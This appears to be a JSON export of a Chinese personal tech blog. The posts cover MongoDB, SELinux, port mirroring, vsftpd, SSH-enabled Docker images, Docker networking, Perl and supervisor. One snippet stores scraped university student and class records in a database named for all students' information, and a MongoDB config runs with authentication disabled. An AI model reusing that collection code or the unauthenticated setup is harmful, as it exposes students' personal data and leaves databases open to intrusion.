&quot;_id&quot; : &quot;zmyzm.com&quot;, &quot;count&quot; : 1038465 &#125;&#123; &quot;_id&quot; : &quot;f02.cn&quot;, &quot;count&quot; : 644959 &#125;&#123; &quot;_id&quot; : &quot;shjmpt.com&quot;, &quot;count&quot; : 502440 &#125;&#123; &quot;_id&quot; : &quot;yzm1&quot;, &quot;count&quot; : 449854 &#125;&#123; &quot;_id&quot; : &quot;yma0.com&quot;, &quot;count&quot; : 417669 &#125;&#123; &quot;_id&quot; : &quot;6yzm.com&quot;, &quot;count&quot; : 297152 &#125;&#123; &quot;_id&quot; : &quot;taomapt.com&quot;, &quot;count&quot; : 187613 &#125;&#123; &quot;_id&quot; : &quot;83r.com&quot;, &quot;count&quot; : 144898 &#125;&#123; &quot;_id&quot; : &quot;kuaima9&quot;, &quot;count&quot; : 138903 &#125;&#123; &quot;_id&quot; : &quot;creditease&quot;, &quot;count&quot; : 101747 &#125;&#123; &quot;_id&quot; : &quot;tongdun&quot;, &quot;count&quot; : 95012 &#125;&#123; &quot;_id&quot; : &quot;aliqin&quot;, &quot;count&quot; : 87845 &#125;&#123; &quot;_id&quot; : &quot;maz8&quot;, &quot;count&quot; : 81461 &#125;&#123; &quot;_id&quot; : &quot;xudan123.com&quot;, &quot;count&quot; : 74808 &#125;&#123; &quot;_id&quot; : &quot;ema6&quot;, &quot;count&quot; : 54819 &#125;&#123; &quot;_id&quot; : &quot;feiq&quot;, &quot;count&quot; : 46670 &#125;&#123; &quot;_id&quot; : &quot;sunvarma.com&quot;, &quot;count&quot; : 45164 &#125;&#123; &quot;_id&quot; : &quot;yayayama.com&quot;, &quot;count&quot; : 44941 &#125; MongoDB 唯一索引自动删除重复记录123456coll.ensureIndex(&#123;productid:1&#125;) // 在productid上建立普通索引coll.ensureIndex(&#123;district:1, plate:1&#125;) // 多字段索引coll.ensureIndex(&#123;productid:1&#125;, &#123;unique:true&#125;) // 唯一索引coll.ensureIndex(&#123;productid:1&#125;, &#123;unique:true, dropDups:true&#125;) // 建索引时，如果遇到索引字段值已经出现过的情况，则删除重复记录coll.getIndexes() // 查看索引coll.dropIndex(&#123;productid:1&#125;) // 删除单个索 Python 相关12345678910111213141516171819202122232425262728293031323334import requestsimport jsonfrom datetime import datetimefrom pymongo import MongoClient&apos;&apos;&apos;连接到mongodb数据库&apos;&apos;&apos;# 使用默认链接client = MongoClient()# 数据库名为gznu_all_student_infodb = client.gznu_all_student_info# 数据库中相关表记录# 学院相关信息college_collection = db.college# 班级相关信息class_collection = db.class_all_class_collection = db.all_class# 学生信息students_collection = db.studentsdef _save_class_code(url, college_code): &apos;&apos;&apos;将班级信息保持到数据库中&apos;&apos;&apos; print &apos;[*] 正在将班级&#123;&#125;信息保存到数据库中&apos;.format(college_code) info = get_info(url) for i in json.loads(info): for j in i[&apos;children&apos;]: item = &#123;&#125; item[&apos;class_code&apos;] = j[&apos;id&apos;] item[&apos;text&apos;] = j[&apos;text&apos;] item[&apos;college_code&apos;] = college_code item[&apos;update&apos;] = datetime.now() class_collection.insert(item) mongodb.config12345678port=27017dbpath=/data/db/fork=truelogpath=/data/logs/mongodb.loglogappend=truenoauth=truenohttpinterface=truerest=false 导入json文件数据将json数据导入到blacklist的phone_number集合中1mongoimport -h 127.0.0.1 -d blacklist -c phone_number --file blacklist3.json 多实例配置 如果想同一台机器跑多个MongoDB，则在启动Mongo的时候指定不同的端口即可，如 12345# 第一个Mongo /dat0/mongodb/bin/mongod --dbpath=/data/db/ --fork --logpath=/data/logs/mongodb.log# 第二个Mongo/dat0/mongodb/bin/mongod --port 27018 --dbpath=/data/data1.5t/mongodb/ --fork --logpath=/data/logs/mongodb-1.5t.log 要使用第二个Mongo，加上端口就好 1234➜ ~ mongo --port 27018MongoDB shell version: 3.2.9connecting to: 127.0.0.1:27018/testServer has startup warnings:","tags":[{"name":"MongoDB","slug":"MongoDB","permalink":"http://yoursite.com/tags/MongoDB/"}]},{"title":"[杂谈]远程管理、SELinux、Raid等","date":"2016-04-20T11:49:27.000Z","path":"devops/杂谈-远程管理、SELinux、Raid等/","text":"常见远程管理工具方式1234RDP: remote desktop protocol 协议，Windows远程桌面管理telnet: CLI 界面下的远程管理，几乎所有操作系统都有，不过内容是明文传送SSH: secure shell CLI界面下的远程管理，几乎所有操作系统都有，内容加密传送，类UNIX系统下主要的远程管理方式(Linux BSD MaxOS X)RFB remote framebuffer,图形化远程管理协议，VNC--Virtual Network Computing 使用的协议，主要为类UNIX系统下主要的图形化远程管理方式 SELinux Secure Enhandced Linux 安全增强Linux是由NSA针对及时基础结构安全开发的一个全新的Linux安全策略机制。SELinux允许管理员更加灵鹤的定义安全策略。SELinux是一个内核级的安全机制，从2.6内核之后集成在内核当中，对其修改一般需要去重启才能生效 基本概览 所有的安全机制都是对两样东西做出限制：进程和系统资源(文件、网络套接字、系统调用等)。 123SELinux针对这两种类型定义了两个基本概念：域(domain)和上下文(context)前者针对进程进行限制后者针对系统资源进行限制 ps -Z可以查看进程的域ls -Z 可以查看文件的上下文信息 RAID 现代硬盘的缺陷 IO性能极弱 稳定性极差RAID廉价磁盘冗余阵列技术是通过多磁盘并行运行来提高计算机的存储IO性能RAID分为很多种类，称之为RAID级别， 1234RAID 0 读写性能RAID 1 读取性能、冗余性RAID 5 读写性能、冗余性(1块硬盘)RAID 6 读写性能、冗余性(2块硬盘)","tags":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/tags/Linux/"}]},{"title":"Kali install VPN Client","date":"2016-03-20T12:05:59.000Z","path":"others/kali-install-VPN-Client/","text":"123456789apt-get install network-manager-openvpn-gnomeapt-get install network-manager-pptpapt-get install network-manager-pptp-gnomeapt-get install network-manager-strongswanapt-get install network-manager-vpncapt-get install network-manager-vpnc-gnome/etc/init.d/network-manager restart如果连接不上请注意VPN协议，连接PPTP协议可以试试将高级——使用点对点加密和发送PPP回响包勾选。 Kali 2.0源列表 12deb http://http.kali.org/kali sana main non-free contribdeb http://security.kali.org/kali-security sana/updates main contrib non-free","tags":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/tags/Linux/"}]},{"title":"旁路镜像、端口镜像、旁路监控","date":"2016-03-20T02:27:03.000Z","path":"devops/旁路镜像、端口镜像、旁路监控/","text":"常见的网络监控模式可以分为两种 一种是旁路监控模式 另一种是串联监控模式。 1“旁路监控模式”一般是指通过交换机等网络设备的“端口镜像”功能来实现监控，在此模式下，监控设备只需要连接到交换机的指定镜像端口，所以形象的称之为“旁路监控”。 1而串联模式一般是通过网关、网桥或者代理服务器的模式来进行监控，由于监控设备做为网关或者网桥串联在网络中，所以称之为“串联监控模式”。 旁路模式的优缺点 优点：123旁路监控模式部署起来比较灵活方便，只需要在交换机上面配置镜像端口即可。不会影响现有的网络结构。而串联模式一般要作为网关、网桥或者代理服务器，所以需要对现有网络结构进行变动。旁路模式分析的是镜像端口拷贝过来的数据，对原始传递的数据包不会造成延时，不会对网速造成任何影响。而串联模式是串联在网络中的，那么所有的数据必须先经过监控系统，通过监控系统的分析检查之后，才能够发送到各个客户端，所以会对网速有一定的延时。旁路监控设备一旦故障或者停止运行，不会影响现有网络。而串联监控设备如果出现故障，会导致网络中断。 缺点：12需要交换机或者路由支持“端口镜像”功能才可以实现监控。旁路模式采用发送RST包的方式来断开TCP连接，不能禁止UDP通讯。对于UDP应用，一般还需要在路由器上面禁止UDP端口进行配合。而串联模式不存在该问题。 串联模式的优缺点 优点：12利用windows自带的“网关”、“网桥”功能即可实现，不需要硬件设备的支持。可以禁止UDP通讯数据包。 缺点：123需要更改现有的网络结构。与“旁路监控”相比较，“网关”、“网桥”的配置更加复杂些。由于是串联模式，当局域网电脑台数多时，对网速有少许的影响。这个主要取决于电脑的硬件配置。 交换机镜像端口配置 用户模式：查看初始化相关信息特权模式：查看所有信息、调试、保持配置信息全局模式：配置所有信息、针对整个路由器或交换机的所有接口接口模式：针对某一个接口的配置线控模式：对路由器进行控制的接口配置 1234567sw-1#show monitor 检查是否已存在镜像的配置sw-1#conf t 进入全局模式sw-1&lt;config&gt;#monitor session 2 source int f0/12 both 监控端口f0/12（外网口或叫被镜像端口） both代表双向监听数据 rx代表接收数据 tx代表发送数据sw-1&lt;config&gt;#monitor session 2 destination int f0/24 把信息复制到f0/24（镜像端口）sw-1&lt;config&gt;#end 返回sw-1#show monitor session 2把F0/12 进来的出去的数据复制一份给F0/24，这样我们在晟为就可以截取到数据了。","tags":[{"name":"others","slug":"others","permalink":"http://yoursite.com/tags/others/"}]},{"title":"Centos vsftpd","date":"2016-03-14T13:27:00.000Z","path":"devops/Centos-vsftpd/","text":"安装vsftpd1yum install vsftpd 设置开机启动1chkconfig vsftpd on 启动服务1service vsftpd start 添加用户组和用户1groupadd ftp mkdir /srv/ftp/test1useradd -g ftp -M -d /srv/ftp/test -s /sbin/nologin test -g接的是用户组-M表示不设置它的主目录，假设如果没有-M，则在/home下会有跟用户名(zhujin)一样的目录。-d后面接的是用zhujin登陆FTP的时候，它的初始目录。-s 后面接/sbin/nologin表示用户不需要登录系统，因为我们只需要用来登陆FTPzhujin表示用户名了 1passwd test 修改目录权限12chown -R test:ftp /srv/ftp/test/etc/init.d/vsftpd restart 相关安全设置 防止跨目录在/etc/vsftpd/vsftpd.conf 下添加 12chroot_list_enable=YESchroot_list_file=/etc/vsftpd/chroot_list 把想要限制的用户写入/etc/vsftpd/chroot_list文件中再重启vsftp服务即可 禁止匿名登录 1anonymous_enable=NO","tags":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/tags/Linux/"}]},{"title":"Docker-SSH","date":"2016-01-20T11:55:38.000Z","path":"virtualization/Docker-SSH/","text":"思路 使用一个ubuntu，配置好ssh服务再打包成image 使用commit构建构建镜像docker run -it ubuntu:14.04 /bin/bash更新镜像并安装ssh-server12apt-get updteapt-get install openssh-server 配置ssh 12mkdir -p /var/run/sshd/usr/sbin/sshd -D &amp; 检查ssh是否运行成功的命令1netstat -tunlp pam登录限制vim /etc/pam.d/sshd12注释掉session required pam_loginuid.so的 如果要使用密码进行ssh认证的话vim /etc/ssh/sshd_config取消注释1PasswordAuthentication yes 使用密钥认证的话在auchorized_keys文件中写入ssh client的id_rsa.pub内容12mkdir /root/.sshvi /root/.ssh/auchorized_keys 创建自动启动SSH脚本 12vi /run.shchmod +x run.sh 文件内容12#!/bin/bash/usr/sbin/sshd -D 退出容器 保存镜像1docker commit eb6bf1856445 sshd:ubuntu2 查看生成的镜像123➜ .ssh docker images sshd:ubuntu2REPOSITORY TAG IMAGE ID CREATED SIZEsshd ubuntu2 d9a07f6fd3f8 34 minutes ago 283.6 MB 使用SSH Server镜像1docker run -p 10000:22 -d sshd:ubuntu2 /run.sh 镜像启动成功 使用密码登录成功 使用密钥登录成功 使用Dockerfile构建 在宿主主机中创建相关文件 123mkdir test_ssh_in_dockercd test_ssh_in_dockertouch Dockerfile run.sh cat run.sh 12vi /run.shchmod +x run.sh cat Dockerfile 1234567891011121314151617181920212223➜ test_ssh_in_docker cat DockerfileFROM ubuntu:14.04MAINTAINER by tp.RUN apt-get -qq update -y#install SSH-ServerRUN apt-get -qq install openssh-server -yRUN mkdir -p /var/run/sshdRUN mkdir -p /root/.sshRUN sed -ri 's/session required pam_loginuid.so/#session required pam.loginuid.so/g' /etc/pam.d/sshd#copy ssh server config fileADD authorized_keys /root/.ssh/authorized_keysADD run.sh /run.shRUN chmod 755 /run.sh#open ssh portEXPOSE 22#start sshd serverCMD [\"/run.sh\"] 目录下所有文件12➜ test_ssh_in_docker lsauthorized_keys Dockerfile run.sh build镜像➜ test_ssh_in_docker docker build -t sshd:dockerfile3 . 创建容器并SSHdocker run -d -p 10244:22 sshd:dockerfile3ssh 127.0.0.1 -p 10244","tags":[{"name":"Docker","slug":"Docker","permalink":"http://yoursite.com/tags/Docker/"},{"name":"虚拟化","slug":"虚拟化","permalink":"http://yoursite.com/tags/虚拟化/"}]},{"title":"Xen Server安装教程","date":"2015-12-20T12:14:45.000Z","path":"virtualization/Xen-Server安装教程/","text":"安装环境VMware首先下载 IOS安装包 1配置信息如下 开始安装1键盘选项默认，点OK继续 ![键盘1保持默认 1accept 用户许可协议 1磁盘信息 默认虚拟存储为sda，点OK继续： 1使用本地介质安装 1不安装增强包 1跳过测试 1root密码 1网络设置 测试使用，我就用DHCP了…… 123时区设置asiashagnhai 1时间服务器 1开始安装 1安装完成","tags":[{"name":"虚拟化","slug":"虚拟化","permalink":"http://yoursite.com/tags/虚拟化/"}]},{"title":"Xen与Kvm","date":"2015-11-14T14:07:25.000Z","path":"virtualization/Xen与Kvm/","text":"Xen 是半虚拟化技术，也叫做准虚拟化技术从性能和成熟度上而言，XEN要优于KVM1XEN是在全虚拟化的基础上，把客户操作系统进行了修改，增加了一个专门的API，使客户操作系统集成了虚拟化方面的代码，该方法无需重新编译或引起陷阱，因为操作系统自身能够与虚拟进程进行很好的协作 KVM 是完全虚拟化技术，又叫硬件辅助虚拟化技术使用Linux内核集成的，所以速度较快KVM最大的好处就在于它是与Linux内核集成的1KVM是在虚拟机和硬件之间加了一个软件层--Hypervisor，或者叫做虚拟机管理程序（VMM），KVM的hypervisor是直接运行在物理硬件之上的 其他文章 虚拟化技术对比：Xen vs KVM","tags":[{"name":"虚拟化","slug":"虚拟化","permalink":"http://yoursite.com/tags/虚拟化/"}]},{"title":"Perl 学习笔记","date":"2015-08-10T03:25:03.000Z","path":"others/Perl-学习笔记/","text":"交互式环境123456➜ ~ perl -eNo code specified for -e.➜ ~ perl -e &apos;print &quot;Hello World&quot;&apos;Hello World% ➜ ~ perl -e &apos;print &quot;Hello World\\n&quot;&apos;Hello World 脚本式编程与注射123456789101112#!/usr/bin/perl##This is single-line comments.print \"Hello, World\\n\";=pod commentsThis is multiline commentThis is multiline commentThis is multiline commentThis is multiline comment=cut 数据类型 Perl 是一种弱类型语言，所以变量不需要指定类型，Perl 解释器会根据上下文自动选择匹配类型。三个基本的数据类型：标量、数组、哈希Perl 为每个变量类型设置了独立的命令空间，所以不同类型的变量可以使用相同的名称，如 $foo 和 @foo 是两个不同的变量。 标量在变量名前加$表示是标量12345#number$my_number=123;#string$my_str=&quot;123&quot;; 标量运算 .可以用来链接两个标量1print ( &quot;$my_number . $my_str\\n&quot;); 特殊字符 分别表示当前执行脚本的文件名，行号，包名。这些特殊字符是单独的标记，不能写在字符串中123print &quot;FileName:&quot; . &quot;\\t&quot;.__FILE__.&quot;\\n&quot;;print &quot;LineNumber:&quot; . &quot;\\t&quot;.__LINE__.&quot;\\n&quot;;print &quot;PackageName:&quot; . &quot;\\t&quot;.__PACKAGE__.&quot;\\n&quot;; 123FileName: run.plLineNumber: 28PackageName: main 数组 数组变量以字符”@”开头，索引从0开始也可以以 qw 开始定义数组 123@arr=(2,3,5);print @arr[2];@array = qw/这是 一个 数组/; 数组序列号12➜ ~ perl -e &quot;print(&quot;1..10&quot;,&quot;\\n&quot;)&quot;12345678910n% 哈希 哈希是一个无序的 key/value 对集合。可以使用键作为下标获取值类似Python的字典123%hash=(&apos;name&apos;=&gt;&apos;LongLi&apos;,&apos;age&apos;=&gt;18);print (%hash&#123;&apos;name&apos;&#125;, &quot;\\n&quot;);print (%hash&#123;&apos;age&apos;&#125;, &quot;\\n&quot;); 1234➜ test ./run.pl Hello, WorldnameLongLiage18","tags":[{"name":"Perl","slug":"Perl","permalink":"http://yoursite.com/tags/Perl/"}]},{"title":"Docker-跨主机连接","date":"2015-07-03T11:47:55.000Z","path":"virtualization/Docker-跨主机连接/","text":"使用网桥 配置简单、不依赖第三方软件；将容器和物理机放在同一网段 网络设置 vim /etc/network/interfaces 12345auto br0iface br0 inet staticnetmask 255.255.255.0gateway 101.210.55.1bridge_ports eth0 Docker网络设置vim /etc/default/docker 12345-b指定使用自定义网桥-b=br0--fixed-cidr限制ip地址分配范围host1: 101.211.55.64/26101.211.55.65~101.211.55.126 演示 使用自定义网桥在启动docker服务的时候，使用-b BEIDGE 或者–bridge=BEIDGE来指定使用的网桥 123456#停止服务并删除旧的网桥service docker stopbrctl delbr docker0#创建新的网桥brctl addbr bridge0ip addr add 192.168.5.1/24 dev bridge0 ip addr show bridge0 配置Docker服务默认桥接到创建的网桥上echo ‘DOCKER_OPTS=”-b=bridge0”‘ &gt;&gt; /etc/default/dockerservice docker start新建容器进行测试 使用Open vSwitch 高质量、多层虚拟交换机 使用GRE协议12GRE 通用路由协议封装隧道技术是一种通过使用互联网络的基础设施在网络之间传递数据的方式，使用隧道传送的数据可以是不同协议的数据帧或包，隧道协议将其它协议的数据帧或包重新封装然后通过隧道发送；新的帧头提供路由信息，以便通过互联网传递被封装的负载数据。 安装 apt-get install openvswitch-switchapt-get install bridge-utils 配置pc1=192.168.1.110pc2=192.168.1.551234567#建立网桥ovs-vsctl add-br obr0#添加GRE连接ovs-vsctl add-port obr0 gre0#配置Docker容器虚拟网桥set interface gre0 type=gre options:remote_ip=192.168.1.55root@tp-ubuntu:/etc/default# ovs-vsctl show 1234brctl addbr br0ifconfig br0 192.168.11.1 netmask 255.255.255.0brctl addif br0 obr0sudo brctl show 1234567891058fa415c-67aa-477d-93b7-6ac0f32fe49d Bridge &quot;obr0&quot; Port &quot;gre0&quot; Interface &quot;gre0&quot; type: gre options: &#123;remote_ip=&quot;192.168.1.55&quot;&#125; Port &quot;obr0&quot; Interface &quot;obr0&quot; type: internal ovs_version: &quot;2.5.0&quot; 修改Docker配置文件为虚拟网桥添加ovs接口vim /etc/default/docker1BRIDGE=br0 使用weave 原理：建立一个虚拟的网络，用于将运行在不同主机的Docker容器连接起来 安装1wget -O /usr/bin/weave https://raw.githubusercontent.com/zettio/weave/master/weave &amp;&amp; chmod a+x /usr/bin/weave weave操作 12345安装weave启动weave weave launch连接不同主机通过weave 启动容器 启动虚拟机 客户机1192.168.1.1101weave luanch 客户机2 1weave launch 192.168.1.110 虚拟机11weave run 192.168.11.2/24 -it ubuntu:14.04 /bin/bash 虚拟机2 1weave run 192.168.11.3/24 -it ubuntu:14.04 /bin/bash 查看weave路由状态weave ps12容器重启问题如果使用weave，则就不能再使用docker自带的auto-restart feature（如docker run –restart=always redis），因为weave是在docker之外为容器配置的网络，容器重启的时候docker本身不会做这些事情。因而，还需额外的工具来管理容器的状态（比如systemd, upstart等），这些工具要调用weave命令（weave run/start/attach）来启动容器。","tags":[{"name":"Docker","slug":"Docker","permalink":"http://yoursite.com/tags/Docker/"},{"name":"虚拟化","slug":"虚拟化","permalink":"http://yoursite.com/tags/虚拟化/"}]},{"title":"Docker-容器间通信","date":"2015-06-19T22:35:49.000Z","path":"virtualization/Docker-容器间通信/","text":"pipework https://github.com/jpetazzo/pipework 思路在同一宿主主机中创建两台容器，通过pipework创建网桥进行通讯 c1docker run –name c1 -it ubuntu:14.04 c2 docker run –name c2 -it ubuntu:14.04 创建网桥git clone https://github.com/jpetazzo/pipework.git 123➜ pipework git:(master) ./pipework br1 c1 192.168.11.1/24➜ pipework git:(master) ./pipework br1 c2 192.168.11.2/24 brctl show 效果图","tags":[{"name":"Docker","slug":"Docker","permalink":"http://yoursite.com/tags/Docker/"},{"name":"虚拟化","slug":"虚拟化","permalink":"http://yoursite.com/tags/虚拟化/"}]},{"title":"Docker构建镜像-Dockerfile","date":"2015-03-27T14:25:06.000Z","path":"virtualization/Docker构建镜像-Dockerfile/","text":"通过dockerfile构建镜像 Docker提供了一种标准化的DSL，你只需要编写一个Dockerfile，运行docker build指令，就可以构建自己的ImageDockerfile指令https://docs.docker.com/engine/reference/builder/ 1234567➜ DockerfileDemo cat DockerfileFROM debianRUN echo &quot;Hello docker!&quot;RUN apt-get update &amp;&amp; apt-get install -y \\nginxRUN echo &apos;Nginx install success&apos; &gt; /var/www/html/index.htmlEXPOSE 80 构建镜像123456789101112➜ DockerfileDemo docker build -t=&quot;debian/nginx:2&quot; .Sending build context to Docker daemon 2.048 kBStep 1 : FROM debian ---&gt; 1b01529cc499Step 2 : RUN echo &quot;Hello docker!&quot; ---&gt; Using cache ---&gt; 3791785c0268Step 3 : RUN apt-get update &amp;&amp; apt-get install -y nginx ---&gt; Using cache ---&gt; 47fcc445f762****************************************Successfully built 26eee4e7b4e4 查看构建成功后的镜像123➜ DockerfileDemo docker images debian/nginx:2REPOSITORY TAG IMAGE ID CREATED SIZEdebian/nginx 2 26eee4e7b4e4 6 minutes ago 196.4 MB 使用该 镜像创建容器-d 告诉容器以分离的方式在后台运行nginx -g “daemon off;” 以前台的方式启动Nginx，作为Web容器1234➜ ~ docker run -itd -p 80 debian/nginx:2 nginx -g &quot;daemon off;&quot;b329360da168141902fc623b71f5cc79540bdffad26b1802e504988925ffec54➜ ~ docker port b329360da168141902fc623b71f5cc79540bdffad26b1802e504988925ffec5480/tcp -&gt; 0.0.0.0:32769 推送镜像至仓库 以docker hub为例 1docker push r65q89/test 补充查看镜像构建历史123456789➜ ~ docker history debian/nginx:2IMAGE CREATED CREATED BY SIZE COMMENT26eee4e7b4e4 10 minutes ago /bin/sh -c #(nop) EXPOSE 80/tcp 0 B fe16089c6b6f 11 minutes ago /bin/sh -c echo 'Nginx install success' &gt; /va 22 B 5c40a6f4eee9 11 minutes ago /bin/sh -c service nginx start 3 B 47fcc445f762 12 minutes ago /bin/sh -c apt-get update &amp;&amp; apt-get install 71.29 MB 3791785c0268 17 minutes ago /bin/sh -c echo \"Hello docker!\" 0 B 1b01529cc499 3 weeks ago /bin/sh -c #(nop) CMD [\"/bin/bash\"] 0 B &lt;missing&gt; 3 weeks ago /bin/sh -c #(nop) ADD file:0e0565652aa852f620 125.1 MB 查看某容器端口映射情况1docker port 容器id 或者这样查看所有docker映射的端口","tags":[{"name":"Docker","slug":"Docker","permalink":"http://yoursite.com/tags/Docker/"},{"name":"虚拟化","slug":"虚拟化","permalink":"http://yoursite.com/tags/虚拟化/"}]},{"title":"Docker构建镜像-commit","date":"2015-03-22T13:23:26.000Z","path":"virtualization/Docker构建镜像-commit/","text":"docker commit 先创建一个容器，并在容器里做出修改,最后commit修改类似github的使用1234➜ ~ docker run -i -t --name test-docker-commit debian /bin/bashroot@8b20759d9e60:/#root@8b20759d9e60:/# apt-get -yqq updateroot@8b20759d9e60:/# apt-get -yqq install ipython commit修改 1234root@8b20759d9e60:/# exitexit➜ ~ docker commit test-docker-commit debian/ipythonsha256:dd7440e1f33791270b82010396b02b8522899619f9336bc998835733b988cd76 查看新创建的镜像 123➜ ~ docker images debian/ipythonREPOSITORY TAG IMAGE ID CREATED SIZEdebian/ipython latest dd7440e1f337 2 minutes ago 173.9 MB 可通过docker inspect查看镜像详细详细 12345678910111213141516➜ ~ docker inspect debian/ipython:v1[ &#123; \"Id\": \"sha256:05fc24b025ad3ad61a121785e53e7748cfd415b6fbb0aad630ae5844e4bd5607\", \"RepoTags\": [ \"debian/ipython:v1\" ], \"RepoDigests\": [], \"Parent\": \"sha256:1b01529cc499d51767c62f9fc8083043610546b4e050898809ec54e00dbb1a34\", \"Comment\": \"base image is debian\", \"Created\": \"2016-08-25T05:54:03.366052897Z\", \"Container\": \"8b20759d9e601a78a1baa8441238297e35a51c95b35fb17f3a1e6399cb540f1a\", \"ContainerConfig\": &#123; \"Hostname\": \"8b20759d9e60\", \"Domainname\": \"\",……………………………… docker commit 的一些参数 12345678910111213➜ ~ docker commit --helpUsage: docker commit [OPTIONS] CONTAINER [REPOSITORY[:TAG]]Create a new image from a container's changesOptions: -a, --author string Author (e.g., \"John Hannibal Smith &lt;hannibal@a-team.com&gt;\") -c, --change value Apply Dockerfile instruction to the created image (default []) --help Print usage -m, --message string Commit message -p, --pause Pause container during commit (default true)➜ ~","tags":[{"name":"Docker","slug":"Docker","permalink":"http://yoursite.com/tags/Docker/"},{"name":"虚拟化","slug":"虚拟化","permalink":"http://yoursite.com/tags/虚拟化/"}]},{"title":"Docker私有仓库","date":"2015-03-20T12:20:14.000Z","path":"virtualization/Docker私有仓库/","text":"搭建仓库 使用docker-registry进行私有仓库搭建 基于容器docker pull registry 12#运行容器并将镜像存储到宿主主机/opt/data/registry目录docker run -d -p 5000 -v /opt/data/registry:/tmp/registry /registry 测试 打开浏览器输入http://127.0.0.1:5000/v2 上传镜像 通过docker tag将该镜像标志为要推送到私有仓库 12docker tag sshd:dockerfile3 127.0.0.1:5000/sshddocker push 127.0.0.1:5000/sshd 拉取镜像1docker pull 127.0.0.1:5000/sshd","tags":[{"name":"Docker","slug":"Docker","permalink":"http://yoursite.com/tags/Docker/"},{"name":"虚拟化","slug":"虚拟化","permalink":"http://yoursite.com/tags/虚拟化/"}]},{"title":"supervisor 使用笔记","date":"2015-03-20T10:38:49.000Z","path":"devops/supervisor-使用笔记/","text":"安装1sudo pip install supervisor 生成配置文件123sudo echo_supervisord_conf &gt; /etc/supervisord.conf# 如果上面的命令报错，则使用sudo su - root -c &quot;echo_supervisord_conf &gt; /etc/supervisord.conf&quot; 修改配置文件 sudo vim /etc/supervisord.conf123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142➜ /etc cat supervisord.conf; Sample supervisor config file.;; For more information on the config file, please see:; http://supervisord.org/configuration.html;; Notes:; - Shell expansion (&quot;~&quot; or &quot;$HOME&quot;) is not supported. Environment; variables can be expanded using this syntax: &quot;%(ENV_HOME)s&quot;.; - Comments must have a leading space: &quot;a=b ;comment&quot; not &quot;a=b;comment&quot;.[unix_http_server]file=/private/var/run/supervisor.sock ; (the path to the socket file);chmod=0700 ; socket file mode (default 0700);chown=nobody:nogroup ; socket file uid:gid owner;username=user ; (default is no username (open server));password=123 ; (default is no password (open server));[inet_http_server] ; inet (TCP) server disabled by default;port=127.0.0.1:9001 ; (ip_address:port specifier, *:port for all iface);username=user ; (default is no username (open server));password=123 ; (default is no password (open server))[supervisord]logfile=/var/log/supervisor/supervisord.log ; (main log file;default $CWD/supervisord.log)logfile_maxbytes=50MB ; (max main logfile bytes b4 rotation;default 50MB)logfile_backups=10 ; (num of main logfile rotation backups;default 10)loglevel=info ; (log level;default info; others: debug,warn,trace)pidfile=/tmp/supervisord.pid ; (supervisord pidfile;default supervisord.pid)nodaemon=false ; (start in foreground if true;default false)minfds=1024 ; (min. avail startup file descriptors;default 1024)minprocs=200 ; (min. avail process descriptors;default 200);umask=022 ; (process file creation umask;default 022);user=chrism ; (default is current user, required if root);identifier=supervisor ; (supervisord identifier, default is &apos;supervisor&apos;);directory=/tmp ; (default is not to cd during start);nocleanup=true ; (don&apos;t clean up tempfiles at start;default false);childlogdir=/tmp ; (&apos;AUTO&apos; child log dir, default $TEMP);environment=KEY=&quot;value&quot; ; (key value pairs to add to environment);strip_ansi=false ; (strip ansi escape codes in logs; def. false); the below section must remain in the config file for RPC; (supervisorctl/web interface) to work, additional interfaces may be; added by defining them in separate rpcinterface: sections[rpcinterface:supervisor]supervisor.rpcinterface_factory = supervisor.rpcinterface:make_main_rpcinterface[supervisorctl]serverurl=unix:///private/var/run/supervisor.sock ; use a unix:// URL for a unix socket;serverurl=http://127.0.0.1:9001 ; use an http:// url to specify an inet socket;username=chris ; should be same as http_username if set;password=123 ; should be same as http_password if set;prompt=mysupervisor ; cmd line prompt (default &quot;supervisor&quot;);history_file=~/.sc_history ; use readline history if available; The below sample program section shows all possible program subsection values,; create one or more &apos;real&apos; program: sections to be able to control them under; supervisor.;[program:theprogramname];command=/bin/cat ; the program (relative uses PATH, can take args);process_name=%(program_name)s ; process_name expr (default %(program_name)s);numprocs=1 ; number of processes copies to start (def 1);directory=/tmp ; directory to cwd to before exec (def no cwd);umask=022 ; umask for process (default None);priority=999 ; the relative start priority (default 999);autostart=true ; start at supervisord start (default: true);startsecs=1 ; # of secs prog must stay up to be running (def. 1);startretries=3 ; max # of serial start failures when starting (default 3);autorestart=unexpected ; when to restart if exited after running (def: unexpected);exitcodes=0,2 ; &apos;expected&apos; exit codes used with autorestart (default 0,2);stopsignal=QUIT ; signal used to kill process (default TERM);stopwaitsecs=10 ; max num secs to wait b4 SIGKILL (default 10);stopasgroup=false ; send stop signal to the UNIX process group (default false);killasgroup=false ; SIGKILL the UNIX process group (def false);user=chrism ; setuid to this UNIX account to run the program;redirect_stderr=true ; redirect proc stderr to stdout (default false);stdout_logfile=/a/path ; stdout log path, NONE for none; default AUTO;stdout_logfile_maxbytes=1MB ; max # logfile bytes b4 rotation (default 50MB);stdout_logfile_backups=10 ; # of stdout logfile backups (default 10);stdout_capture_maxbytes=1MB ; number of bytes in &apos;capturemode&apos; (default 0);stdout_events_enabled=false ; emit events on stdout writes (default false);stderr_logfile=/a/path ; stderr log path, NONE for none; default AUTO;stderr_logfile_maxbytes=1MB ; max # logfile bytes b4 rotation (default 50MB);stderr_logfile_backups=10 ; # of stderr logfile backups (default 10);stderr_capture_maxbytes=1MB ; number of bytes in &apos;capturemode&apos; (default 0);stderr_events_enabled=false ; emit events on stderr writes (default false);environment=A=&quot;1&quot;,B=&quot;2&quot; ; process environment additions (def no adds);serverurl=AUTO ; override serverurl computation (childutils); The below sample eventlistener section shows all possible; eventlistener subsection values, create one or more &apos;real&apos;; eventlistener: sections to be able to handle event notifications; sent by supervisor.;[eventlistener:theeventlistenername];command=/bin/eventlistener ; the program (relative uses PATH, can take args);process_name=%(program_name)s ; process_name expr (default %(program_name)s);numprocs=1 ; number of processes copies to start (def 1);events=EVENT ; event notif. types to subscribe to (req&apos;d);buffer_size=10 ; event buffer queue size (default 10);directory=/tmp ; directory to cwd to before exec (def no cwd);umask=022 ; umask for process (default None);priority=-1 ; the relative start priority (default -1);autostart=true ; start at supervisord start (default: true);startsecs=1 ; # of secs prog must stay up to be running (def. 1);startretries=3 ; max # of serial start 